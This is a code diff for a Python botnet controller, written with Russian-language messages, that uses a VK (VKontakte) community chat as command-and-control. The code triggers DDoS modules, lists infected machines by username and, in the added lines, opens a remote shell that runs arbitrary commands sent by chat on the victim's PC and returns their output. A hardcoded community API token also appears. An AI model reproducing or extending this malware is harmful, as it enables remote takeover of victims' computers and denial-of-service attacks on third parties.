@@ -1,17 +1,18 @@
 from MainDDoS import mainDDoS
 from SecondDDoS import secondDDoS
 from POSTGET import message
+from CMD import cmd
 from vk_api import VkApi
 from vk_api.utils import get_random_id
 from vk_api.longpoll import VkLongPoll, VkEventType
 from getpass import getuser
+import os
 
-token = '4691d8f6706204dafcf4410fb911a1e515b2dcfde010bd34940b4e4388499a6f1f1ff452c28d91003cfce' # Community token
+token = '4691d8f6706204dafcf4410fb911a1e515b2dcfde010bd34940b4e4388499a0f6f1ff452c28d91003cfce' # Community token
 
 vk_session = VkApi(token=token) # "Run" your community
 vk = vk_session.get_api() # Begin work with API
 longpoll = VkLongPoll(vk_session) # Longpoll makes that community recive messagess
-
 
 
 name = getuser() # Name = name of your PC
@@ -27,6 +28,7 @@ for event in longpoll.listen():
             message("Команды: ")
             message('DDoS - войти в DDoS панель')
             message('Check - проверить появились-ли новые боты')
+            message('Имя бота + cmd - командная строка')
             message('online - боты онлайн')
             for event in longpoll.listen(): # Wait for next command
                 if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
@@ -42,5 +44,27 @@ for event in longpoll.listen():
                         secondDDoS() # Run secondDDoS - without notification
                     elif event.text == 'online':
                         message(name + ' - онлайн') # Show all bots online
-
-
+                    elif event.text == name + ' cmd':
+                        message(cmd("cd"))
+                        message('Для выхода введите "Выход"')
+                        for event in longpoll.listen():  # Wait for next command
+                            if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
+                                if event.text != "Выход":
+                                    command = '"' + event.text + '"'
+                                    try:
+                                        if (event.text == "cd"):
+                                            message("Введите директорию. Для выхода введите выход")
+                                            for event in longpoll.listen():  # Wait for next command
+                                                if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
+                                                    if event.text != "Выход":
+                                                        os.chdir(event.text)
+                                                        break
+                                                    else:
+                                                        message("Выходим...")
+                                                        break
+                                        message(cmd(command))
+                                    except:
+                                        message("Произошла ошибка. Попробуйте еще раз...")
+                                else:
+                                    message("Выходим...")
+                                    break
